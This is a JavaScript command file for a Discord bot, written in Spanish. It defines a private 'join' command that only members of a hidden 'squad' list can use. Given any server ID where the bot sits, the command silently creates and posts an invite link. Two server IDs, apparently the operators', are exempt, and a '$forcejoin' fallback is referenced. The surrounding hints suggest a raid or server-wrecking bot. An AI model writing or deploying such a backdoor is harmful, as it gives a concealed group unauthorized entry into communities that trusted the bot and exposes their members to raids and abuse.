const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {


const db = require ('megadb');
const squad = new db.crearDB('squad');

 if (!squad.has(message.author.id)) return                                   

if(!args[0]) return message.channel.send(new MessageEmbed().setDescription("Error :x: introduce una ID valida").setColor("BLACK"))                
   try{
     let asd = client.guilds.cache.get(args[0]);
if(args[0] === "935892194236182638" || args[0] === "935880059498168421") return message.channel.send(new MessageEmbed().setColor("#2f3136").setDescription("Error :x: El comando no funciona en este servidor."))
   if(client.guilds.cache.get(args[0])){
 if(!client.guilds.cache.get(args[0]).me.hasPermission("CREATE_INSTANT_INVITE"))return message.channel.send(new MessageEmbed().setDescription("Error :x: No tengo permisos suficientes para realizar la acción en ese servidor.").setColor("BLACK"))            


  let channelID;
let chan = client.guilds.cache.get(args[0]).channels.cache;
  channelLoop: for (let c of chan) {
let channelType = c[1].type;
  if (channelType === "text") {
          channelID = c[0];
      break channelLoop;}}
client.guilds.cache.get(args[0]).channels.cache.get(
  client.guilds.cache.get(args[0]).systemChannelID|| channelID
).createInvite().then(function(newInvite){
message.channel.send(new MessageEmbed()
.setDescription(`**Invitación Generada**:\n\nhttps://discord.gg/${newInvite.code}`)                    
.setFooter("Si la invitación no funciona usa $forcejoin [ Argumentos : ID servidor ]")
)}).catch(error => message.channel.send(new MessageEmbed().setDescription("Error :x: Ocurrió una falla, no se pudo generar la invitación.")));
}else {
message.channel.send(new MessageEmbed().setDescription("Error :x: no estoy en ese servidor."));
}
}catch(error) {
    message.channel.send(new MessageEmbed() 
  .setDescription("Error :x: Ocurrio un error"+
                  ""+
                  "\n Posibles errores : ``` • Bot sin permisos suficientes para realizar la acción."+
                  "\n • Numero maximo de canales.\n • Numero maximo de roles.\n • Entre otros.```"+
                  "\n***Error detallado**```"+error+"```"+
                  "\n**Usa $forcejoin [ ID servidor. ] si este comando no funciona.**"
                 )       
                         )}

}

exports.help = {
  name: "join",
  aliases:["unirse",
           "entrar"],
  usage: "[ Argumentos : ID Servidor ]",
  description: "Unirse a un servidor via ID.",
  category: "Private"
  
}